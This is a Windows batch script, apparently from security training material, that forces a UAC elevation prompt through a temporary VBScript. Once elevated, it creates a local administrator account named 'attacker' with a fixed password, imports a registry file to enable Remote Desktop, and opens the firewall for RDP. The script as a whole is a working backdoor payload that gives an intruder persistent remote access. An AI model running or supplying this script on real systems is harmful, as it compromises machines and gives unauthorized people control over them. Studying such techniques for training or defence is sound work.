@echo off
REM This script uses "net file" to test for elevation, then runs itself after UAC elevation
REM Technique used from http://tinyurl.com/Sec660-UAC-elev
REM This script is experimental but the technique should work on XP thru Windows 8

cd %~dp0

:checkPriv 
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotUAC ) else ( goto getUAC ) 

:getUAC
if '%1'=='ELEV' (shift & goto gotUAC)  
ECHO Forcing UAC for Escalation 

setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion
ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPriv.vbs" 
ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPriv.vbs" 
"%temp%\OEgetPriv.vbs" 
exit /B 

:gotUAC
::::::::::::::::::::::::::::
:START
::::::::::::::::::::::::::::
setlocal & pushd .

REM Rest of batch file runs elevated!

cd %~dp0
net user /add attacker P@ssword
net localgroup /add administrators attacker
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" backup_rdp.reg
reg import enablerdp.reg
netsh firewall set service type = remotedesktop mode = enable
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain 
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
ping -n 1 10.10.75.X > NUL
